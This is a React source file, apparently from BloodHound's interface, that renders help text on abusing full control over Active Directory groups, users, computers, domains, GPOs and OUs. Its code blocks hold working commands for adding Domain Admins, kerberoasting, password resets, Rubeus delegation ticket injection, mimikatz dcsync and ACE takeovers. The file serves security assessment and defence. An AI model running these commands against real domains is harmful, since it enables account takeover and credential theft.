// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Typography } from '@mui/material';
import { EdgeInfoProps } from '../index';

const WindowsAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> = ({
    sourceName,
    sourceType,
    targetName,
    targetType,
    targetId,
    haslaps,
}) => {
    switch (targetType) {
        case 'Group':
            return (
                <>
                    <Typography variant='body2'>
                        Full control of a group allows you to directly modify group membership of the group.
                    </Typography>

                    <Typography variant='body2'>
                        There are at least two ways to execute this attack. The first and most obvious is by using the
                        built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See
                        the opsec considerations tab for why this may be a bad idea. The second, and highly recommended
                        method, is by using the Add-DomainGroupMember function in PowerView. This function is superior
                        to using the net.exe binary in several ways. For instance, you can supply alternate credentials,
                        instead of needing to run a process as or logon as the user with the AddMember privilege.
                        Additionally, you have much safer execution options than you do with spawning net.exe (see the
                        opsec tab).
                    </Typography>

                    <Typography variant='body2'>
                        To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your
                        agent session or into a PowerShell instance at the console. You may need to authenticate to the
                        Domain Controller as{' '}
                        {sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`}
                        . To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object
                        (these examples comes from the PowerView help documentation):
                    </Typography>

                    <Typography component={'pre'}>
                        {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
                            "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
                    </Typography>

                    <Typography variant='body2'>
                        Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a
                        process as {sourceName}:
                    </Typography>

                    <Typography component={'pre'}>
                        {"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}
                    </Typography>

                    <Typography variant='body2'>
                        Finally, verify that the user was successfully added to the group with PowerView's
                        Get-DomainGroupMember:
                    </Typography>

                    <Typography component={'pre'}>{"Get-DomainGroupMember -Identity 'Domain Admins'"}</Typography>
                </>
            );
        case 'User':
            return (
                <>
                    <Typography variant='body2'>
                        Full control of a user allows you to modify properties of the user to perform a targeted
                        kerberoast attack, and also grants the ability to reset the password of the user without knowing
                        their current one.
                    </Typography>

                    <Typography variant='body1'> Targeted Kerberoast </Typography>

                    <Typography variant='body2'>
                        A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with
                        Get-DomainSPNTicket.
                    </Typography>

                    <Typography variant='body2'>
                        You may need to authenticate to the Domain Controller as{' '}
                        {sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`}
                        . To do this in conjunction with Set-DomainObject, first create a PSCredential object (these
                        examples comes from the PowerView help documentation):
                    </Typography>

                    <Typography component={'pre'}>
                        {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
                            "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
                    </Typography>

                    <Typography variant='body2'>
                        Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process
                        as {sourceName}:
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            "Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"
                        }
                    </Typography>

                    <Typography variant='body2'>
                        After running this, you can use Get-DomainSPNTicket as follows:
                    </Typography>

                    <Typography component={'pre'}>{'Get-DomainSPNTicket -Credential $Cred harmj0y | fl'}</Typography>

                    <Typography variant='body2'>
                        The recovered hash can be cracked offline using the tool of your choice. Cleanup of the
                        ServicePrincipalName can be done with the Set-DomainObject command:
                    </Typography>

                    <Typography component={'pre'}>
                        {'Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname'}
                    </Typography>

                    <Typography variant='body1'> Force Change Password </Typography>

                    <Typography variant='body2'>
                        There are at least two ways to execute this attack. The first and most obvious is by using the
                        built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec
                        considerations tab for why this may be a bad idea. The second, and highly recommended method, is
                        by using the Set-DomainUserPassword function in PowerView. This function is superior to using
                        the net.exe binary in several ways. For instance, you can supply alternate credentials, instead
                        of needing to run a process as or logon as the user with the ForceChangePassword privilege.
                        Additionally, you have much safer execution options than you do with spawning net.exe (see the
                        opsec tab).
                    </Typography>

                    <Typography variant='body2'>
                        To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into
                        your agent session or into a PowerShell instance at the console. You may need to authenticate to
                        the Domain Controller as{' '}
                        {sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`}
                        . To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object
                        (these examples comes from the PowerView help documentation):
                    </Typography>

                    <Typography component={'pre'}>
                        {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
                            "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
                    </Typography>

                    <Typography variant='body2'>
                        Then create a secure string object for the password you want to set on the target user:
                    </Typography>

                    <Typography component={'pre'}>
                        {"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}
                    </Typography>

                    <Typography variant='body2'>
                        Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running
                        a process as {sourceName}:
                    </Typography>

                    <Typography component={'pre'}>
                        {'Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred'}
                    </Typography>

                    <Typography variant='body2'>
                        Now that you know the target user's plain text password, you can either start a new agent as
                        that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions,
                        or perhaps even RDP to a system the target user has access to. For more ideas and information,
                        see the references tab.
                    </Typography>
                </>
            );
        case 'Computer':
            if (haslaps) {
                return (
                    <>
                        <Typography variant='body2'>
                            Full control of a computer object is abusable when the computer's local admin account
                            credential is controlled with LAPS. The clear-text password for the local administrator
                            account is stored in an extended attribute on the computer object called ms-Mcs-AdmPwd. With
                            full control of the computer object, you may have the ability to read this attribute, or
                            grant yourself the ability to read the attribute by modifying the computer object's security
                            descriptor.
                        </Typography>

                        <Typography variant='body2'>
                            Alternatively, Full control of a computer object can be used to perform a resource based
                            constrained delegation attack.
                        </Typography>

                        <Typography variant='body2'>
                            Abusing this primitive is possible through the Rubeus project.
                        </Typography>

                        <Typography variant='body2'>
                            First, if an attacker does not control an account with an SPN set, Kevin Robertson's
                            Powermad project can be used to add a new attacker-controlled computer account:
                        </Typography>

                        <Typography component={'pre'}>
                            {
                                "New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"
                            }
                        </Typography>

                        <Typography variant='body2'>
                            PowerView can be used to then retrieve the security identifier (SID) of the newly created
                            computer account:
                        </Typography>

                        <Typography component={'pre'}>
                            $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand
                            objectsid
                        </Typography>

                        <Typography variant='body2'>
                            We now need to build a generic ACE with the attacker-added computer SID as the principal,
                            and get the binary bytes for the new DACL/ACE:
                        </Typography>

                        <Typography component={'pre'}>
                            {'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n' +
                                '$SDBytes = New-Object byte[] ($SD.BinaryLength)\n' +
                                '$SD.GetBinaryForm($SDBytes, 0)'}
                        </Typography>

                        <Typography variant='body2'>
                            Next, we need to set this newly created security descriptor in the
                            msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over,
                            again using PowerView in this case:
                        </Typography>

                        <Typography component={'pre'}>
                            {
                                "Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"
                            }
                        </Typography>

                        <Typography variant='body2'>
                            We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                        </Typography>

                        <Typography component={'pre'}>{'Rubeus.exe hash /password:Summer2018!'}</Typography>

                        <Typography variant='body2'>
                            And finally we can use Rubeus' *s4u* module to get a service ticket for the service name
                            (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt),
                            and in this case grants us access to the file system of the TARGETCOMPUTER:
                        </Typography>

                        <Typography component={'pre'}>
                            {
                                'Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'
                            }
                        </Typography>
                    </>
                );
            } else {
                return (
                    <>
                        <Typography variant='body2'>
                            Full control of a computer object can be used to perform a resource based constrained
                            delegation attack.
                        </Typography>

                        <Typography variant='body2'>
                            Abusing this primitive is possible through the Rubeus project.
                        </Typography>

                        <Typography variant='body2'>
                            First, if an attacker does not control an account with an SPN set, Kevin Robertson's
                            Powermad project can be used to add a new attacker-controlled computer account:
                        </Typography>

                        <Typography component={'pre'}>
                            {
                                "New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"
                            }
                        </Typography>

                        <Typography variant='body2'>
                            PowerView can be used to then retrieve the security identifier (SID) of the newly created
                            computer account:
                        </Typography>

                        <Typography component={'pre'}>
                            {
                                '$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid'
                            }
                        </Typography>

                        <Typography variant='body2'>
                            We now need to build a generic ACE with the attacker-added computer SID as the principal,
                            and get the binary bytes for the new DACL/ACE:
                        </Typography>

                        <Typography component={'pre'}>
                            {'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n' +
                                '$SDBytes = New-Object byte[] ($SD.BinaryLength)\n' +
                                '$SD.GetBinaryForm($SDBytes, 0)'}
                        </Typography>

                        <Typography variant='body2'>
                            Next, we need to set this newly created security descriptor in the
                            msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over,
                            again using PowerView in this case:
                        </Typography>

                        <Typography component={'pre'}>
                            {
                                "Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"
                            }
                        </Typography>

                        <Typography variant='body2'>
                            We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                        </Typography>

                        <Typography component={'pre'}>{'Rubeus.exe hash /password:Summer2018!'}</Typography>

                        <Typography variant='body2'>
                            And finally we can use Rubeus' *s4u* module to get a service ticket for the service name
                            (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt),
                            and in this case grants us access to the file system of the TARGETCOMPUTER:
                        </Typography>

                        <Typography component={'pre'}>
                            {
                                'Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'
                            }
                        </Typography>
                    </>
                );
            }
        case 'Domain':
            return (
                <>
                    <Typography variant='body2'>
                        Full control of a domain object grants you both DS-Replication-Get-Changes as well as
                        DS-Replication-Get-Changes-All rights. The combination of these rights allows you to perform the
                        dcsync attack using mimikatz. To grab the credential of the user harmj0y using these rights:
                    </Typography>

                    <Typography component={'pre'}>{'lsadump::dcsync /domain:testlab.local /user:harmj0y'}</Typography>
                </>
            );
        case 'GPO':
            return (
                <>
                    <Typography variant='body2'>
                        With full control of a GPO, you may make modifications to that GPO which will then apply to the
                        users and computers affected by the GPO. Select the target object you wish to push an evil
                        policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows
                        item-level targeting, such as a new immediate scheduled task. Then wait for the group policy
                        client to pick up and execute the new evil policy. See the references tab for a more detailed
                        write up on this abuse.
                    </Typography>
                </>
            );
        case 'OU':
            return (
                <>
                    <Typography variant='body1'>Control of the Organization Unit</Typography>

                    <Typography variant='body2'>
                        With full control of the OU, you may add a new ACE on the OU that will inherit down to the
                        objects under that OU. Below are two options depending on how targeted you choose to be in this
                        step:
                    </Typography>

                    <Typography variant='body1'>Generic Descendent Object Takeover</Typography>
                    <Typography variant='body2'>
                        The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll
                        ACE on the OU that will inherit down to all object types. Again, this can be done using
                        PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control
                        over the ACE we add to the OU.
                    </Typography>

                    <Typography variant='body2'>
                        First, we need to reference the OU by its ObjectGUID, not its name. The ObjectGUID for the OU{' '}
                        {targetName} is: {targetId}.
                    </Typography>

                    <Typography variant='body2'>
                        Next, we will fetch the GUID for all objects. This should be
                        '00000000-0000-0000-0000-000000000000':
                    </Typography>

                    <Typography component={'pre'}>
                        {'$Guids = Get-DomainGUIDMap\n' +
                            "$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name"}
                    </Typography>

                    <Typography variant='body2'>
                        Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full
                        control of all descendant objects:
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            "$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"
                        }
                    </Typography>

                    <Typography variant='body2'>Finally, we will apply this ACE to our target OU:</Typography>

                    <Typography component={'pre'}>
                        {'$OU = Get-DomainOU -Raw (OU GUID)\n' +
                            '$DsEntry = $OU.GetDirectoryEntry()\n' +
                            "$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n" +
                            '$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n' +
                            '$dsEntry.PsBase.CommitChanges()'}
                    </Typography>

                    <Typography variant='body2'>
                        Now, the "JKOHLER" user will have full control of all descendent objects of each type.
                    </Typography>

                    <Typography variant='body1'>Targeted Descendent Object Takeoever</Typography>

                    <Typography variant='body2'>
                        If you want to be more targeted with your approach, it is possible to specify precisely what
                        right you want to apply to precisely which kinds of descendent objects. You could, for example,
                        grant a user "ForceChangePassword" privilege against all user objects, or grant a security group
                        the ability to read every GMSA password under a certain OU. Below is an example taken from
                        PowerView's help text on how to grant the "ITADMIN" user the ability to read the LAPS password
                        from all computer objects in the "Workstations" OU:
                    </Typography>

                    <Typography component={'pre'}>
                        {'$Guids = Get-DomainGUIDMap\n' +
                            "$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name\n" +
                            "$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name\n" +
                            '$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid\n' +
                            '$OU = Get-DomainOU -Raw Workstations\n' +
                            '$DsEntry = $OU.GetDirectoryEntry()\n' +
                            "$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n" +
                            '$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n' +
                            '$dsEntry.PsBase.CommitChanges()'}
                    </Typography>
                </>
            );
        default:
            return <></>;
    }
};

export default WindowsAbuse;
